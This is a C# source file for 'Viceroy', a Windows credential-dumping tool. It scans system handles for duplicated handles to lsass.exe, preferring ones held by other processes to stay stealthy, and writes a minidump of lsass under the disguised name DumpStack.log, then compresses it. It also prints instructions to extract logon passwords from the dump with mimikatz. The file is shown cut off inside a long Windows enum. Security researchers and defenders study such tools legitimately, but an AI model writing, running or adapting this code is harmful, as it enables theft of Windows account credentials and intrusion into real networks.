using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;



namespace Viceroy
{
    class Program
    {

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            return principal.IsInRole(WindowsBuiltInRole.Administrator);

        }
        public static void GetSEDebugPrivs()
        {
            bool previous = false;
            var sedebug = man21.AdjustTokenPrivileges(20, true, false, out previous);
            Console.WriteLine("[+] SeDebugPrivs obtained");

        }


        public static new Dictionary<IntPtr, int> GetallHandles()
        {

            Dictionary<IntPtr, int> gold = new Dictionary<IntPtr, int>();
            // get an initial size
            var systemHandleInformation = new man21.SYSTEM_HANDLE_INFORMATION();
            var systemInformationLength = Marshal.SizeOf(systemHandleInformation);
            var systemInformationPtr = Marshal.AllocHGlobal(systemInformationLength);

            var returnLength = 0;

            //in the def of this rm makes it an int. try that eh



            while (man21.NtQuerySystemInformation((int)man21.SYSTEM_INFORMATION_CLASS.SystemHandleInformation, systemInformationPtr, systemInformationLength, ref returnLength) == (uint)(man21.NTSTATUS.InfoLengthMismatch))
            {
                // get the return length
                systemInformationLength = returnLength;

                // free the previously allocated memory
                Marshal.FreeHGlobal(systemInformationPtr);

                // allocate a new memory region
                systemInformationPtr = Marshal.AllocHGlobal(systemInformationLength);
            }

            var numberOfHandles = Marshal.ReadInt64(systemInformationPtr);
            var handleEntryPtr = new IntPtr((long)systemInformationPtr + sizeof(long));
            Dictionary<int, List<man21.SYSTEM_HANDLE_TABLE_ENTRY_INFO>> allHandles = new();

            for (var i = 0; i < numberOfHandles; i++)
            {
                var handleTableEntry = (man21.SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(handleEntryPtr, typeof(man21.SYSTEM_HANDLE_TABLE_ENTRY_INFO));

                handleEntryPtr = new IntPtr((long)handleEntryPtr + Marshal.SizeOf(handleTableEntry));

                if (!allHandles.ContainsKey(handleTableEntry.UniqueProcessId))
                    allHandles.Add(handleTableEntry.UniqueProcessId, new List<man21.SYSTEM_HANDLE_TABLE_ENTRY_INFO>());

                allHandles[handleTableEntry.UniqueProcessId].Add(handleTableEntry);
            }

            Console.WriteLine("number of handles is " + numberOfHandles);
            Marshal.FreeHGlobal(systemInformationPtr);


            // kvp is our dictionary

       

            foreach (var kvp in allHandles)
            {
                // this is the PID with the open handles
                var pid = kvp.Key;
      
                // this is the list of SYSTEM_HANDLE_TABLE_ENTRY_INFO
                var handles = kvp.Value;

                var hProcess = IntPtr.Zero;

            
                foreach (var handle in handles)
                {
                    // check if the handle has the required privilege
                    var grantedAccess = (man21.PROCESS_ACCESS_FLAGS)handle.GrantedAccess;
                    if (!grantedAccess.HasFlag(man21.PROCESS_ACCESS_FLAGS.VMRead)) continue;

                    var oa = (int)man21.OBJECT_INFORMATION_CLASS.ObjectBasicInformation;
                    // get a handle to the process if we don't already have one

                    if (hProcess == IntPtr.Zero)                  
                        hProcess = man21.OpenProcess(man21.PROCESS_ACCESS_FLAGS.DupHandle, false, pid);
                    int error = Marshal.GetLastWin32Error();
         
                    // if the handle is still zero, then continue
                    // likely error was access denied
                    if (hProcess == IntPtr.Zero) continue;

                 
                    // initialise
                    var hDuplicate = IntPtr.Zero;

                    
                    var self = Process.GetCurrentProcess();

                    //duplicate handle
                    IntPtr srchandle = new IntPtr(handle.HandleValue);
                    var status = man21.DuplicateHandle(hProcess, srchandle, self.Handle, ref hDuplicate, 0, false, 0x00000002);

                    if (status != true || hDuplicate == IntPtr.Zero) continue;
                    error = Marshal.GetLastWin32Error();

               

                    var objTypeInfo = new man21.OBJECT_TYPE_INFORMATION();
                    var objTypeInfoLength = Marshal.SizeOf(objTypeInfo);
                    var objTypePtr = Marshal.AllocHGlobal(objTypeInfoLength);

                    returnLength = 0;

                    while (man21.NtQueryObject(hDuplicate, (int)man21.OBJECT_INFORMATION_CLASS.ObjectTypeInformation, objTypePtr, objTypeInfoLength, ref returnLength) == (uint)(man21.NTSTATUS.InfoLengthMismatch))
                    {
                        objTypeInfoLength = returnLength;
                        Marshal.FreeHGlobal(objTypePtr);
                        objTypePtr = Marshal.AllocHGlobal(objTypeInfoLength);
                    }

                    objTypeInfo = (man21.OBJECT_TYPE_INFORMATION)Marshal.PtrToStructure(objTypePtr, typeof(man21.OBJECT_TYPE_INFORMATION));
                    Marshal.FreeHGlobal(objTypePtr);


                    var objTypeInfoBuf = new byte[objTypeInfo.TypeName.Length];
                    Marshal.Copy(objTypeInfo.TypeName.Buffer, objTypeInfoBuf, 0, objTypeInfo.TypeName.Length);//breaks here?

                    var typeName = Encoding.Unicode.GetString(objTypeInfoBuf);
                    error = Marshal.GetLastWin32Error();
                    if (typeName.Equals("Process", StringComparison.OrdinalIgnoreCase))
                    {

                        string exeName = "";
                        StringBuilder buffer = new StringBuilder(2048);
                        int size = buffer.Capacity;
                        bool success = man21.QueryFullProcessImageName(hDuplicate, 0, buffer, ref size);
                        error = Marshal.GetLastWin32Error();
                        if (error == 5) continue; //access denied?
                        exeName = buffer.ToString();


                        if (!exeName.EndsWith("lsass.exe")) continue;
                        //add to our dictionary 
                        gold.Add(hDuplicate, pid);
                        continue;
                      


                    }
                    else
                    { 

                        //Console.WriteLine("NOPE its a " + typeName);
                        man21.CloseHandle(hDuplicate);
                        continue;
                        //return IntPtr.Zero;

                    }


                }

                if (hProcess != IntPtr.Zero)
                    man21.CloseHandle(hProcess);
            }




            return gold;
        }

        public static IntPtr ChooseRandomLsassHandle(Dictionary<IntPtr, int> lsassHandlesAndTheirParentPid)
        {
            IntPtr lsassHandle = IntPtr.Zero;
            Random rnd = new Random();
            int index = rnd.Next(lsassHandlesAndTheirParentPid.Count);
            lsassHandle = lsassHandlesAndTheirParentPid.ElementAt(index).Key;
            int parentProcessID = lsassHandlesAndTheirParentPid.ElementAt(index).Value;
            String parentProcessName = Process.GetProcessById(parentProcessID).ProcessName;
            Console.WriteLine("chosen to use the handle 0x{0}, duped from {1} to dump. \n", string.Format("{0:X}", lsassHandle.ToInt64()), parentProcessName);
            return lsassHandle;
        }


        public static void Compress(string inFile, string outFile)
        {
            try
            {
                if (File.Exists(outFile))
                {
                    Console.WriteLine("[X] Output file '{0}' already exists, removing", outFile);
                    File.Delete(outFile);
                }

                var bytes = File.ReadAllBytes(inFile);
                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                {
                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    {
                        zipStream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception while compressing file: {0}", ex.Message);
            }
        }



        public static void Minidump(IntPtr lsassHandle, string dumpFile, int pid = -1)
        {
           

            if (!IsHighIntegrity())
            {
                Console.WriteLine("\n[X] Not in high integrity, unable to MiniDump!\n");
                return;
            }




            bool bRet = false;

            string zipFile = dumpFile + ".tmp";
            using var fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write);

            Console.WriteLine("Our handle is: 0x{0:X}\n", lsassHandle.ToInt64());

            Console.WriteLine("Calling MiniDumpWriteDump...");

            bRet = man21.MiniDumpWriteDump(
              lsassHandle,
               0,
               fs.SafeFileHandle,
               2,
               IntPtr.Zero,
               IntPtr.Zero,
               IntPtr.Zero);

            Console.WriteLine(bRet ? "[+] Dump successful!" : "[X] Dump failed: {0}", bRet);
            fs.Close();

            if (bRet)
            {
                Console.WriteLine("[+] Dump successful!");
                Console.WriteLine(String.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));

                Compress(dumpFile, zipFile);

                Console.WriteLine(String.Format("[*] Deleting {0}", dumpFile));
                File.Delete(dumpFile);
                Console.WriteLine("\n[+] Dumping completed. Rename file to \"{0}.gz\" to decompress.", dumpFile);
                Console.WriteLine("\n[+] Then name the file within to a .bin file");

                string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                string OS = "";
                var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
                if (regKey != null)
                {
                    OS = String.Format("{0}", regKey.GetValue("ProductName"));
                }

                if (pid == -1)
                {
                    Console.WriteLine(String.Format("\n[*] Operating System : {0}", OS));
                    Console.WriteLine(String.Format("[*] Architecture     : {0}", arch));
                    Console.WriteLine(String.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
                }
            }
            else
            {
                Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
            }

        }



        public static void Main(string[] args)
        {


     
            string dumpFile = "";

            if (args.Length == 0)
            {
                //     string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
                //dumpFile = "duplicate.bin";
              
                Console.WriteLine(@"Duplicate handles to lsass and create dump file:
  Usage: Viceroy.exe <fulll path to write dump file to>");
                return;

            }
            else
            {
                dumpFile = args[0] + "\\DumpStack.log";
            }
            // dump non LSASS by default
            //make this a dictionary it returns with all handles to lsass
            GetSEDebugPrivs();
            IsHighIntegrity();
            Dictionary<IntPtr, int> lsassHandlesAndTheirParents = GetallHandles();
            Console.WriteLine("{0} LSASS handles duped: \n", lsassHandlesAndTheirParents.Count);
            if (lsassHandlesAndTheirParents.Count == 0 )
            { Console.WriteLine(@"ngl I have no idea why this happened, maybe try:" +
                "run in powershell or run as system");
                return;
                    }
            IntPtr lsassHandle = IntPtr.Zero;
            Dictionary<IntPtr, int> gold = new Dictionary<IntPtr, int>();
            foreach (KeyValuePair<IntPtr, int> handleEntry in lsassHandlesAndTheirParents)
            {
                Process originalProcess = Process.GetProcessById(handleEntry.Value);
                String originalProcessName = originalProcess.ProcessName;

                if (originalProcessName != "lsass")
                {
                    Console.WriteLine("new non LSASS handle 0x{0} obtained! Prioritising duped from original process: {1}", string.Format("{0:X}", handleEntry.Key.ToInt64()), originalProcessName);
                    gold.Add(handleEntry.Key, handleEntry.Value);
                }
                Console.WriteLine("new LSASS handle 0x{0} obtained! duped from original process: {1}", string.Format("{0:X}", handleEntry.Key.ToInt64()), originalProcessName);


            }
            if (gold.Count != 0)
            {
                IntPtr finalhandle = ChooseRandomLsassHandle(gold);
                Minidump(finalhandle, dumpFile);
            }

            else
            {
                IntPtr finalhandle = ChooseRandomLsassHandle(lsassHandlesAndTheirParents);
                Minidump(finalhandle, dumpFile);
            }



        }
    
     

        class man21
        {

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct SYSTEM_HANDLE_INFORMATION
            { // Information Class 16
                public ushort ProcessID;
                public ushort CreatorBackTrackIndex;
                public byte ObjectType;
                public byte HandleAttribute;
                public UInt16 HandleValue;
                public ushort Handle;
                public IntPtr Object_Pointer;
                public IntPtr AccessMask;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
            { // Information Class 16
                public ushort UniqueProcessId;
                public ushort CreatorBackTrackIndex;
                public byte ObjectType;
                public byte HandleAttribute;
                public UInt16 HandleValue;
                public IntPtr Object_Pointer;
                public IntPtr GrantedAccess;

            }

            public enum OBJECT_INFORMATION_CLASS : int
            {
                ObjectBasicInformation = 0,
                ObjectNameInformation = 1,
                ObjectTypeInformation = 2,
                ObjectAllTypesInformation = 3,
                ObjectHandleInformation = 4
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct OBJECT_NAME_INFORMATION
            { // Information Class 1
                public UNICODE_STRING Name;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct UNICODE_STRING
            {
                public ushort Length;
                public ushort MaximumLength;
                public IntPtr Buffer;
            }

            [Flags]
            public enum PROCESS_ACCESS_FLAGS : uint
            {
                All = 0x001F0FFF,
                Terminate = 0x00000001,
                CreateThread = 0x00000002,
                VMOperation = 0x00000008,
                VMRead = 0x0010,
                //VMRead = 0x00000010,
                VMWrite = 0x00000020,
                DupHandle = 0x0040,
                // DupHandle = 0x00000040,
                SetInformation = 0x00000200,
                QueryInformation = 0x0400,
                //QueryInformation = 0x00000400,
                QueryLimitedInformation = 0x10000000,
                Synchronize = 0x00100000,
                DUPLICATE_SAME_ACCESS = 0x00000002
            }

            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            public static extern string QueryFullProcessImageNameW(IntPtr hProcess, int dwFlags, StringBuilder lpExeName, ref int size);

            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            public static extern bool QueryFullProcessImageNameA(IntPtr hprocess, int dwFlags,  StringBuilder lpExeName, ref int size);
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool QueryFullProcessImageName(IntPtr hProcess, uint dwFlags,  StringBuilder lpExeName, ref int lpdwSize);

            public struct OBJECT_BASIC_INFORMATION
            {
                public UInt32 Attributes;
                public UInt32 GrantedAccess;
                public UInt32 HandleCount;
                public UInt32 PointerCount;
                public UInt32 PagedPoolUsage;
                public UInt32 NonPagedPoolUsage;
                public UInt32 Reserved1;
                public UInt32 Reserved2;
                public UInt32 Reserved3;
                public UInt32 NameInformationLength;
                public UInt32 TypeInformationLength;
                public UInt32 SecurityDescriptorLength;
                public System.Runtime.InteropServices.ComTypes.FILETIME CreateTime;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct OBJECT_TYPE_INFORMATION
            { // Information Class 2
                public UNICODE_STRING TypeName;
                public int ObjectCount;
                public int HandleCount;
                public int Reserved1;
                public int Reserved2;
                public int Reserved3;
                public int Reserved4;
                public int PeakObjectCount;
                public int PeakHandleCount;
                public int Reserved5;
                public int Reserved6;
                public int Reserved7;
                public int Reserved8;
                public int InvalidAttributes;
                public GENERIC_MAPPING GenericMapping;
                public int ValidAccess;
                public byte Unknown;
                public byte MaintainHandleDatabase;
                public int PoolType;
                public int PagedPoolUsage;
                public int NonPagedPoolUsage;

            }
            [StructLayout(LayoutKind.Sequential)]
            public struct GENERIC_MAPPING
            {
                public int GenericRead;
                public int GenericWrite;
                public int GenericExecute;
                public int GenericAll;
            }



            public enum FileType : uint
            {
                FileTypeChar = 0x0002,
                FileTypeDisk = 0x0001,
                FileTypePipe = 0x0003,
                FileTypeRemote = 0x8000,
                FileTypeUnknown = 0x0000,
            }


            [DllImport("ntdll.dll")]
            public static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);
                 [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool DuplicateHandle(IntPtr SourceProcessHandle, IntPtr SourceHandle, IntPtr TargetProcessHandle, ref IntPtr TargetHandle, PROCESS_ACCESS_FLAGS DesiredAcess, bool bInheritHandle, uint dwOptions);

            [DllImport("ntdll.dll")]
            public static extern uint NtQueryObject(IntPtr ObjectHandle, int ObjectInformationClass, IntPtr ObjectInformation, int ObjectInformationLength, ref int returnLength);



            [DllImport("kernel32.dll")]
            public static extern IntPtr OpenProcess(PROCESS_ACCESS_FLAGS dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId);
          
        
            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool AdjustTokenPrivileges(int Privilege, bool EnablePriv, bool isThreadedPriv, out bool previousValue);

           

            [DllImport("kernel32.dll")]
            public static extern bool CloseHandle(IntPtr hObject);


     



            [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
            public static extern bool MiniDumpWriteDump(IntPtr hProcess, int processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

    

            [Flags]
            public enum NTSTATUS : uint
            {
                // Success
                Success = 0x00000000,
                Wait0 = 0x00000000,
                Wait1 = 0x00000001,
                Wait2 = 0x00000002,
                Wait3 = 0x00000003,
                Wait63 = 0x0000003f,
                Abandoned = 0x00000080,
                AbandonedWait0 = 0x00000080,
                AbandonedWait1 = 0x00000081,
                AbandonedWait2 = 0x00000082,
                AbandonedWait3 = 0x00000083,
                AbandonedWait63 = 0x000000bf,
                UserApc = 0x000000c0,
                KernelApc = 0x00000100,
                Alerted = 0x00000101,
                Timeout = 0x00000102,
                Pending = 0x00000103,
                Reparse = 0x00000104,
                MoreEntries = 0x00000105,
                NotAllAssigned = 0x00000106,
                SomeNotMapped = 0x00000107,
                OpLockBreakInProgress = 0x00000108,
                VolumeMounted = 0x00000109,
                RxActCommitted = 0x0000010a,
                NotifyCleanup = 0x0000010b,
                NotifyEnumDir = 0x0000010c,
                NoQuotasForAccount = 0x0000010d,
                PrimaryTransportConnectFailed = 0x0000010e,
                PageFaultTransition = 0x00000110,
                PageFaultDemandZero = 0x00000111,
                PageFaultCopyOnWrite = 0x00000112,
                PageFaultGuardPage = 0x00000113,
                PageFaultPagingFile = 0x00000114,
                CrashDump = 0x00000116,
                ReparseObject = 0x00000118,
                NothingToTerminate = 0x00000122,
                ProcessNotInJob = 0x00000123,
                ProcessInJob = 0x00000124,
                ProcessCloned = 0x00000129,
                FileLockedWithOnlyReaders = 0x0000012a,
                FileLockedWithWriters = 0x0000012b,

                // Informational
                Informational = 0x40000000,
                ObjectNameExists = 0x40000000,
                ThreadWasSuspended = 0x40000001,
                WorkingSetLimitRange = 0x40000002,
                ImageNotAtBase = 0x40000003,
                RegistryRecovered = 0x40000009,

                // Warning
                Warning = 0x80000000,
                GuardPageViolation = 0x80000001,
                DatatypeMisalignment = 0x80000002,
                Breakpoint = 0x80000003,
                SingleStep = 0x80000004,
                BufferOverflow = 0x80000005,
                NoMoreFiles = 0x80000006,
                HandlesClosed = 0x8000000a,
                PartialCopy = 0x8000000d,
                DeviceBusy = 0x80000011,
                InvalidEaName = 0x80000013,
                EaListInconsistent = 0x80000014,
                NoMoreEntries = 0x8000001a,
                LongJump = 0x80000026,
                DllMightBeInsecure = 0x8000002b,

                // Error
                Error = 0xc0000000,
                Unsuccessful = 0xc0000001,
                NotImplemented = 0xc0000002,
                InvalidInfoClass = 0xc0000003,
                InfoLengthMismatch = 0xc0000004,
                AccessViolation = 0xc0000005,
                InPageError = 0xc0000006,
                PagefileQuota = 0xc0000007,
                InvalidHandle = 0xc0000008,
                BadInitialStack = 0xc0000009,
                BadInitialPc = 0xc000000a,
                InvalidCid = 0xc000000b,
                TimerNotCanceled = 0xc000000c,
                InvalidParameter = 0xc000000d,
                NoSuchDevice = 0xc000000e,
                NoSuchFile = 0xc000000f,
                InvalidDeviceRequest = 0xc0000010,
                EndOfFile = 0xc0000011,
                WrongVolume = 0xc0000012,
                NoMediaInDevice = 0xc0000013,
                NoMemory = 0xc0000017,
                NotMappedView = 0xc0000019,
                UnableToFreeVm = 0xc000001a,
                UnableToDeleteSection = 0xc000001b,
                IllegalInstruction = 0xc000001d,
                AlreadyCommitted = 0xc0000021,
                AccessDenied = 0xc0000022,
                BufferTooSmall = 0xc0000023,
                ObjectTypeMismatch = 0xc0000024,
                NonContinuableException = 0xc0000025,
                BadStack = 0xc0000028,
                NotLocked = 0xc000002a,
                NotCommitted = 0xc000002d,
                InvalidParameterMix = 0xc0000030,
                ObjectNameInvalid = 0xc0000033,
                ObjectNameNotFound = 0xc0000034,
                ObjectNameCollision = 0xc0000035,
                ObjectPathInvalid = 0xc0000039,
                ObjectPathNotFound = 0xc000003a,
                ObjectPathSyntaxBad = 0xc000003b,
                DataOverrun = 0xc000003c,
                DataLate = 0xc000003d,
                DataError = 0xc000003e,
                CrcError = 0xc000003f,
                SectionTooBig = 0xc0000040,
                PortConnectionRefused = 0xc0000041,
                InvalidPortHandle = 0xc0000042,
                SharingViolation = 0xc0000043,
                QuotaExceeded = 0xc0000044,
                InvalidPageProtection = 0xc0000045,
                MutantNotOwned = 0xc0000046,
                SemaphoreLimitExceeded = 0xc0000047,
                PortAlreadySet = 0xc0000048,
                SectionNotImage = 0xc0000049,
                SuspendCountExceeded = 0xc000004a,
                ThreadIsTerminating = 0xc000004b,
                BadWorkingSetLimit = 0xc000004c,
                IncompatibleFileMap = 0xc000004d,
                SectionProtection = 0xc000004e,
                EasNotSupported = 0xc000004f,
                EaTooLarge = 0xc0000050,
                NonExistentEaEntry = 0xc0000051,
                NoEasOnFile = 0xc0000052,
                EaCorruptError = 0xc0000053,
                FileLockConflict = 0xc0000054,
                LockNotGranted = 0xc0000055,
                DeletePending = 0xc0000056,
                CtlFileNotSupported = 0xc0000057,
                UnknownRevision = 0xc0000058,
                RevisionMismatch = 0xc0000059,
                InvalidOwner = 0xc000005a,
                InvalidPrimaryGroup = 0xc000005b,
                NoImpersonationToken = 0xc000005c,
                CantDisableMandatory = 0xc000005d,
                NoLogonServers = 0xc000005e,
                NoSuchLogonSession = 0xc000005f,
                NoSuchPrivilege = 0xc0000060,
                PrivilegeNotHeld = 0xc0000061,
                InvalidAccountName = 0xc0000062,
                UserExists = 0xc0000063,
                NoSuchUser = 0xc0000064,
                GroupExists = 0xc0000065,
                NoSuchGroup = 0xc0000066,
                MemberInGroup = 0xc0000067,
                MemberNotInGroup = 0xc0000068,
                LastAdmin = 0xc0000069,
                WrongPassword = 0xc000006a,
                IllFormedPassword = 0xc000006b,
                PasswordRestriction = 0xc000006c,
                LogonFailure = 0xc000006d,
                AccountRestriction = 0xc000006e,
                InvalidLogonHours = 0xc000006f,
                InvalidWorkstation = 0xc0000070,
                PasswordExpired = 0xc0000071,
                AccountDisabled = 0xc0000072,
                NoneMapped = 0xc0000073,
                TooManyLuidsRequested = 0xc0000074,
                LuidsExhausted = 0xc0000075,
                InvalidSubAuthority = 0xc0000076,
                InvalidAcl = 0xc0000077,
                InvalidSid = 0xc0000078,
                InvalidSecurityDescr = 0xc0000079,
                ProcedureNotFound = 0xc000007a,
                InvalidImageFormat = 0xc000007b,
                NoToken = 0xc000007c,
                BadInheritanceAcl = 0xc000007d,
                RangeNotLocked = 0xc000007e,
                DiskFull = 0xc000007f,
                ServerDisabled = 0xc0000080,
                ServerNotDisabled = 0xc0000081,
                TooManyGuidsRequested = 0xc0000082,
                GuidsExhausted = 0xc0000083,
                InvalidIdAuthority = 0xc0000084,
                AgentsExhausted = 0xc0000085,
                InvalidVolumeLabel = 0xc0000086,
                SectionNotExtended = 0xc0000087,
                NotMappedData = 0xc0000088,
                ResourceDataNotFound = 0xc0000089,
                ResourceTypeNotFound = 0xc000008a,
                ResourceNameNotFound = 0xc000008b,
                ArrayBoundsExceeded = 0xc000008c,
                FloatDenormalOperand = 0xc000008d,
                FloatDivideByZero = 0xc000008e,
                FloatInexactResult = 0xc000008f,
                FloatInvalidOperation = 0xc0000090,
                FloatOverflow = 0xc0000091,
                FloatStackCheck = 0xc0000092,
                FloatUnderflow = 0xc0000093,
                IntegerDivideByZero = 0xc0000094,
                IntegerOverflow = 0xc0000095,
                PrivilegedInstruction = 0xc0000096,
                TooManyPagingFiles = 0xc0000097,
                FileInvalid = 0xc0000098,
                InstanceNotAvailable = 0xc00000ab,
                PipeNotAvailable = 0xc00000ac,
                InvalidPipeState = 0xc00000ad,
                PipeBusy = 0xc00000ae,
                IllegalFunction = 0xc00000af,
                PipeDisconnected = 0xc00000b0,
                PipeClosing = 0xc00000b1,
                PipeConnected = 0xc00000b2,
                PipeListening = 0xc00000b3,
                InvalidReadMode = 0xc00000b4,
                IoTimeout = 0xc00000b5,
                FileForcedClosed = 0xc00000b6,
                ProfilingNotStarted = 0xc00000b7,
                ProfilingNotStopped = 0xc00000b8,
                NotSameDevice = 0xc00000d4,
                FileRenamed = 0xc00000d5,
                CantWait = 0xc00000d8,
                PipeEmpty = 0xc00000d9,
                CantTerminateSelf = 0xc00000db,
                InternalError = 0xc00000e5,
                InvalidParameter1 = 0xc00000ef,
                InvalidParameter2 = 0xc00000f0,
                InvalidParameter3 = 0xc00000f1,
                InvalidParameter4 = 0xc00000f2,
                InvalidParameter5 = 0xc00000f3,
                InvalidParameter6 = 0xc00000f4,
                InvalidParameter7 = 0xc00000f5,
                InvalidParameter8 = 0xc00000f6,
                InvalidParameter9 = 0xc00000f7,
                InvalidParameter10 = 0xc00000f8,
                InvalidParameter11 = 0xc00000f9,
                InvalidParameter12 = 0xc00000fa,
                MappedFileSizeZero = 0xc000011e,
                TooManyOpenedFiles = 0xc000011f,
                Cancelled = 0xc0000120,
                CannotDelete = 0xc0000121,
                InvalidComputerName = 0xc0000122,
                FileDeleted = 0xc0000123,
                SpecialAccount = 0xc0000124,
                SpecialGroup = 0xc0000125,
                SpecialUser = 0xc0000126,
                MembersPrimaryGroup = 0xc0000127,
                FileClosed = 0xc0000128,
                TooManyThreads = 0xc0000129,
                ThreadNotInProcess = 0xc000012a,
                TokenAlreadyInUse = 0xc000012b,
                PagefileQuotaExceeded = 0xc000012c,
                CommitmentLimit = 0xc000012d,
                InvalidImageLeFormat = 0xc000012e,
                InvalidImageNotMz = 0xc000012f,
                InvalidImageProtect = 0xc0000130,
                InvalidImageWin16 = 0xc0000131,
                LogonServer = 0xc0000132,
                DifferenceAtDc = 0xc0000133,
                SynchronizationRequired = 0xc0000134,
                DllNotFound = 0xc0000135,
                IoPrivilegeFailed = 0xc0000137,
                OrdinalNotFound = 0xc0000138,
                EntryPointNotFound = 0xc0000139,
                ControlCExit = 0xc000013a,
                PortNotSet = 0xc0000353,
                DebuggerInactive = 0xc0000354,
                CallbackBypass = 0xc0000503,
                PortClosed = 0xc0000700,
                MessageLost = 0xc0000701,
                InvalidMessage = 0xc0000702,
                RequestCanceled = 0xc0000703,
                RecursiveDispatch = 0xc0000704,
                LpcReceiveBufferExpected = 0xc0000705,
                LpcInvalidConnectionUsage = 0xc0000706,
                LpcRequestsNotAllowed = 0xc0000707,
                ResourceInUse = 0xc0000708,
                ProcessIsProtected = 0xc0000712,
                VolumeDirty = 0xc0000806,
                FileCheckedOut = 0xc0000901,
                CheckOutRequired = 0xc0000902,
                BadFileType = 0xc0000903,
                FileTooLarge = 0xc0000904,
                FormsAuthRequired = 0xc0000905,
                VirusInfected = 0xc0000906,
                VirusDeleted = 0xc0000907,
                TransactionalConflict = 0xc0190001,
                InvalidTransaction = 0xc0190002,
                TransactionNotActive = 0xc0190003,
                TmInitializationFailed = 0xc0190004,
                RmNotActive = 0xc0190005,
                RmMetadataCorrupt = 0xc0190006,
                TransactionNotJoined = 0xc0190007,
                DirectoryNotRm = 0xc0190008,
                CouldNotResizeLog = 0xc0190009,
                TransactionsUnsupportedRemote = 0xc019000a,
                LogResizeInvalidSize = 0xc019000b,
                RemoteFileVersionMismatch = 0xc019000c,
                CrmProtocolAlreadyExists = 0xc019000f,
                TransactionPropagationFailed = 0xc0190010,
                CrmProtocolNotFound = 0xc0190011,
                TransactionSuperiorExists = 0xc0190012,
                TransactionRequestNotValid = 0xc0190013,
                TransactionNotRequested = 0xc0190014,
                TransactionAlreadyAborted = 0xc0190015,
                TransactionAlreadyCommitted = 0xc0190016,
                TransactionInvalidMarshallBuffer = 0xc0190017,
                CurrentTransactionNotValid = 0xc0190018,
                LogGrowthFailed = 0xc0190019,
                ObjectNoLongerExists = 0xc0190021,
                StreamMiniversionNotFound = 0xc0190022,
                StreamMiniversionNotValid = 0xc0190023,
                MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
                CantOpenMiniversionWithModifyIntent = 0xc0190025,
                CantCreateMoreStreamMiniversions = 0xc0190026,
                HandleNoLongerValid = 0xc0190028,
                NoTxfMetadata = 0xc0190029,
                LogCorruptionDetected = 0xc0190030,
                CantRecoverWithHandleOpen = 0xc0190031,
                RmDisconnected = 0xc0190032,
                EnlistmentNotSuperior = 0xc0190033,
                RecoveryNotNeeded = 0xc0190034,
                RmAlreadyStarted = 0xc0190035,
                FileIdentityNotPersistent = 0xc0190036,
                CantBreakTransactionalDependency = 0xc0190037,
                CantCrossRmBoundary = 0xc0190038,
                TxfDirNotEmpty = 0xc0190039,
                IndoubtTransactionsExist = 0xc019003a,
                TmVolatile = 0xc019003b,
                RollbackTimerExpired = 0xc019003c,
                TxfAttributeCorrupt = 0xc019003d,
                EfsNotAllowedInTransaction = 0xc019003e,
                TransactionalOpenNotAllowed = 0xc019003f,
                TransactedMappingUnsupportedRemote = 0xc0190040,
                TxfMetadataAlreadyPresent = 0xc0190041,
                TransactionScopeCallbacksNotSet = 0xc0190042,
                TransactionRequiredPromotion = 0xc0190043,
                CannotExecuteFileInTransaction = 0xc0190044,
                TransactionsNotFrozen = 0xc0190045,

                MaximumNTSTATUS = 0xffffffff
            }
            [Flags]

            public enum SYSTEM_INFORMATION_CLASS
            {
                SystemBasicInformation = 0x00,
                SystemProcessorInformation = 0x01,
                SystemPerformanceInformation = 0x02,
                SystemTimeOfDayInformation = 0x03,
                SystemPathInformation = 0x04,
                SystemProcessInformation = 0x05,
                SystemCallCountInformation = 0x06,
                SystemDeviceInformation = 0x07,
                SystemProcessorPerformanceInformation = 0x08,
                SystemFlagsInformation = 0x09,
                SystemCallTimeInformation = 0x0A,
                SystemModuleInformation = 0x0B,
                SystemLocksInformation = 0x0C,
                SystemStackTraceInformation = 0x0D,
                SystemPagedPoolInformation = 0x0E,
                SystemNonPagedPoolInformation = 0x0F,
                SystemHandleInformation = 0x10,
                SystemObjectInformation = 0x11,
                SystemPageFileInformation = 0x12,
                SystemVdmInstemulInformation = 0x13,
                SystemVdmBopInformation = 0x14,
                SystemFileCacheInformation = 0x15,
                SystemPoolTagInformation = 0x16,
                SystemInterruptInformation = 0x17,
                SystemDpcBehaviorInformation = 0x18,
                SystemFullMemoryInformation = 0x19,
                SystemLoadGdiDriverInformation = 0x1A,
